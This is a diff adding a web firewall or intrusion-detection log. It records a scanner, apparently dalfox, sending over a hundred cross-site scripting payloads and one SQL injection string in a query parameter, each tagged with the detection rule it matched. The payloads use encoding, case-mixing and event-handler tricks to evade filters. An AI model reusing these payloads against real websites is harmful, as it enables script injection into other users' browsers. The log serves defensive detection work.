@@ -1,0 +1,157 @@
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [SQLi] | request: query=+HAVING+1=1--
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad<ScRipt>alert.bind()(1)</script>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<sVg/onload=alert.bind()(1)+class=dalfox>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad<ScRipt>prompt(1)</script>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad&lt;xmp&gt;&lt;p+title=&#34;&lt;/xmp&gt;&lt;svg/onload=confirm(1)&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<sVg/onload=prompt.valueOf()(1)>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad<iFrAme/src=jaVascRipt:print(1)+class=dalfox></iFramE>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad&#34;&gt;&lt;img/src/onerror=.1|alert``&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad'><sVg/onload=alert(1)+id=dalfox>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad"><script y="><">/*<script* */prompt()</script
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=print(1)></menu></div>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<sVg/onload=confirm(1)+class=dalfox>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad"><svg/OnLoad="`${prompt``}`">
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<audio controls ondurationchange=alert(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad&#34;&gt;&lt;svg/OnLoad=&#34;`${prompt``}`&#34;&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [XSS_Attacks, Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<sVg/onload=prompt(1)>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<sVg/onload=print(1)>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad&lt;audio+controls+ondurationchange=prompt(1)+id=dalfox&gt;&lt;source+src=1.mp3+type=audio/mpeg&gt;&lt;/audio&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad'"><svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad<iFrAme/src=jaVascRipt:prompt(1) class=dalfox></iFramE>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad&lt;ScRipt&gt;alert(1)&lt;/script&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad"><a href="javascript&colon;alert(1)">click
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad<iFrAme/src=jaVascRipt:alert(1)></iFramE>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [XSS_Attacks, Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<sVg/onload=alert(1)>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad<audio controls ondurationchange=prompt(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad&#39;&gt;&lt;img/src/onerror=.1|alert``&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<sVg/onload=confirm(1)>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<xmp><p+title="</xmp><svg/onload=confirm(1)+class=dalfox>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad&#39;&gt;&lt;svg/class=&#39;dalfox&#39;onLoad=alert(1)&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad&#34;&gt;&lt;iFrAme/src=jaVascRipt:alert(1)&gt;&lt;/iFramE&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad&lt;sVg/onload=alert(1)+class=dalfox&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=asdsad&#34;&gt;&lt;script/&#34;&lt;a&#34;/src=data:=&#34;.&lt;a,[].some(confirm)&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad<ScRipt class=dalfox>prompt.valueOf()(1)</script>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad'"><iframe srcdoc="<input onauxclick=alert(1)>" class=dalfox></iframe>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad"><iFrAme/src=jaVascRipt:alert(1)></iFramE>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<sVg/onload=alert.bind()(1)>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<sVg/onload=prompt(1) class=dalfox>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad<div+contextmenu=xss><p>1<menu+type=context+class=dalfox+id=xss+onshow=confirm(1)></menu></div>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=prompt(1)></menu></div>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad"><svg/class="dalfox"onLoad=alert(1)>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<xmp><p title="</xmp><svg/onload=confirm(1)>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=prompt(1)></menu></div>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad&lt;ScRipt&gt;confirm(1)&lt;/script&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad<iframe srcdoc="<input onauxclick=alert.bind()(1)>" class=dalfox></iframe>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad<iFrAme/src=jaVascRipt:prompt.valueOf()(1) class=dalfox></iFramE>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [XSS_Attacks, Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<xmp><p title="</xmp><svg/onload=alert(1)>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad&#39;&gt;&lt;sVg/onload=alert(1)+class=dalfox&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<sVg/onload=alert(1) class=dalfox>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad'"><img/src/onerror=.1|alert``>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad"><svg/OnLoad="`${prompt``}`" class=dalfox>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad'><sVg/onload=alert(1)+class=dalfox>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad&lt;iFrAme/src=jaVascRipt:confirm(1)+class=dalfox&gt;&lt;/iFramE&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad'><sVg/onload=alert(1) class=dalfox>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [XSS_Attacks, Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<xmp><p+title="</xmp><svg/onload=alert(1)>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad<iFrAme/src=jaVascRipt:print(1)></iFramE>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad&lt;iFrAme/src=jaVascRipt:alert(1)&gt;&lt;/iFramE&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad'><img/src/onerror=.1|alert``>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad&#34;&gt;&lt;img/src/onerror=.1|alert``+class=dalfox&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad&#34;&gt;&lt;script+y=&#34;&gt;&lt;&#34;&gt;/*&lt;script*+*/prompt()&lt;/script
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad</ScriPt><sCripT id=dalfox>alert(1)</sCriPt>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<sVg/onload=prompt.valueOf()(1)>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad'><a+href='javascript&colon;alert(1)'>click
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad&lt;/script&gt;&lt;svg&gt;&lt;script/class=dalfox&gt;alert(1)&lt;/script&gt;-&apos;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<xmp><p title="</xmp><svg/onload=prompt.valueOf()(1)>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<sVg/onload=print(1)+class=dalfox>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad<iFrAme/src=jaVascRipt:prompt(1)></iFramE>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad<iFrAme/src=jaVascRipt:alert(1)></iFramE>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad'"><iframe+srcdoc="<input+onauxclick=alert(1)>"+class=dalfox></iframe>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad<iframe srcdoc="<input onauxclick=prompt.valueOf()(1)>" class=dalfox></iframe>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad<iframe srcdoc="<input onauxclick=print(1)>" class=dalfox></iframe>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad<ScRipt class=dalfox>print(1)</script>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<xmp><p title="</xmp><svg/onload=alert.bind()(1)>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad<iframe srcdoc="<input onauxclick=alert(1)>" class=dalfox></iframe>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad<iFrAme/src=jaVascRipt:alert.bind()(1)+class=dalfox></iFramE>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad<iFrAme/src=jaVascRipt:prompt.valueOf()(1) class=dalfox></iFramE>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=alert(1)></menu></div>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad<iframe+srcdoc="<input+onauxclick=print(1)>"+class=dalfox></iframe>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad&lt;audio+controls+ondurationchange=alert(1)+id=dalfox&gt;&lt;source+src=1.mp3+type=audio/mpeg&gt;&lt;/audio&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad<iframe srcdoc="<input onauxclick=prompt(1)>" class=dalfox></iframe>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<sVg/onload=print(1)>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad&lt;sVg/onload=alert(1)&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad&lt;sVg/onload=print(1)&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<ScRipt>prompt.valueOf()(1)</script>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad<audio controls ondurationchange=prompt(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad"><img/src/onerror=.1|alert``>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad&#34;&gt;&lt;svg/class=&#34;dalfox&#34;onLoad=alert(1)&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad&#34;&gt;&lt;SvG/onload=alert(1)+id=dalfox&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad<ScRipt>confirm(1)</script>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad&lt;ScRipt&gt;print(1)&lt;/script&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad'"><img/src/onerror=.1|alert``>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad'><a href='javascript&colon;alert(1)'>click
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad</script><svg><script/class=dalfox>alert(1)</script>-&apos;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad&lt;iFrAme/src=jaVascRipt:alert(1)+class=dalfox&gt;&lt;/iFramE&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad"><iFrAme/src=jaVascRipt:alert(1) class=dalfox></iFramE>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<xmp><p+title="</xmp><svg/onload=prompt.valueOf()(1)>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad'><a href=javas&#99;ript:alert(1)/class=dalfox>click
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad&lt;iFrAme/src=jaVascRipt:print(1)+class=dalfox&gt;&lt;/iFramE&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad<iFrAme/src=jaVascRipt:prompt.valueOf()(1)+class=dalfox></iFramE>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad<audio controls ondurationchange=confirm(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad'><img/src/onerror=.1|alert``+class=dalfox>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad"><SvG/onload=alert(1)+id=dalfox>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad<ScRipt class=dalfox>alert(1)</script>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad&lt;ScRipt+class=dalfox&gt;prompt(1)&lt;/script&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad&#39;&gt;&lt;sVg/onload=alert(1)+id=dalfox&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad<audio+controls+ondurationchange=prompt(1)+id=dalfox><source+src=1.mp3+type=audio/mpeg></audio>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<xmp><p title="</xmp><svg/onload=prompt.valueOf()(1)>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad</ScriPt><sCripT id=dalfox>alert(1)</sCriPt>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [XSS_Attacks, Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<xmp><p+title="</xmp><svg/onload=prompt(1)>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad'"><img/src/onerror=.1|alert``+class=dalfox>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad<iframe srcdoc="<input onauxclick=print(1)>" class=dalfox></iframe>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad&lt;sVg/onload=prompt.valueOf()(1)+class=dalfox&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad&lt;xmp&gt;&lt;p+title=&#34;&lt;/xmp&gt;&lt;svg/onload=print(1)&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad'><img/src/onerror=.1|alert``>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad<iFrAme/src=jaVascRipt:alert.bind()(1)></iFramE>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad&lt;xmp&gt;&lt;p+title=&#34;&lt;/xmp&gt;&lt;svg/onload=alert(1)+class=dalfox&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad<iFrAme/src=jaVascRipt:alert.bind()(1) class=dalfox></iFramE>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad"><svg/class="dalfox"onLoad=alert(1)>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad&lt;iframe+srcdoc=&#34;&lt;input+onauxclick=print(1)&gt;&#34;+class=dalfox&gt;&lt;/iframe&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad&#39;&#34;&gt;&lt;svg/onload=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#00116&amp;#40&amp;#41&amp;#x2f&amp;#x2f
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad&lt;iframe+srcdoc=&#34;&lt;input+onauxclick=alert(1)&gt;&#34;+class=dalfox&gt;&lt;/iframe&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad<iframe srcdoc="<input onauxclick=confirm(1)>" class=dalfox></iframe>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<xmp><p+title="</xmp><svg/onload=prompt(1)+class=dalfox>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<sVg/onload=print(1) class=dalfox>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad<audio+controls+ondurationchange=print(1)+id=dalfox><source+src=1.mp3+type=audio/mpeg></audio>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad<ScRipt class=dalfox>prompt.valueOf()(1)</script>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad"><Svg/onload=alert(1) class=dlafox>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [XSS_Attacks, Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<xmp><p title="</xmp><svg/onload=prompt(1)>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<iFrAme/src=jaVascRipt:print(1) class=dalfox></iFramE>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad'><img/src/onerror=.1|alert`` class=dalfox>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, detect_xss_payloads_bypass_with_condition_and_bypass_HTML5, XSS_Attacks, Dangerous_XSS_Payloads] | request: query=asdsad<ScRipt>alert(1)</script>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<sVg/onload=confirm(1) class=dalfox>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad&lt;/ScriPt&gt;&lt;sCripT+id=dalfox&gt;alert(1)&lt;/sCriPt&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad&lt;iframe+srcdoc=&#34;&lt;input+onauxclick=prompt(1)&gt;&#34;+class=dalfox&gt;&lt;/iframe&gt;
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad<iFrAme/src=jaVascRipt:confirm(1)></iFramE>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Dangerous_XSS_Payloads] | request: query=asdsad"><iFrAme/src=jaVascRipt:alert(1)></iFramE>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad'"><svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<iFrAme/src=jaVascRipt:print(1) class=dalfox></iFramE>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Dangerous_XSS_Payloads] | request: query=asdsad'><a href=javas&#99;ript:alert(1)/class=dalfox>click
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<xmp><p+title="</xmp><svg/onload=prompt.valueOf()(1)+class=dalfox>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<xmp><p+title="</xmp><svg/onload=alert.bind()(1)+class=dalfox>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad"><Svg/onload=alert(1)+class=dlafox>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<sVg/onload=confirm(1)>
+Sun Jun 23 01:55:47 2024 - From: 192.168.193.130 | Match: [XSS_Attacks, Detect_XSS_Payloads3, Dangerous_XSS_Payloads] | request: query=asdsad<sVg/onload=prompt(1)>
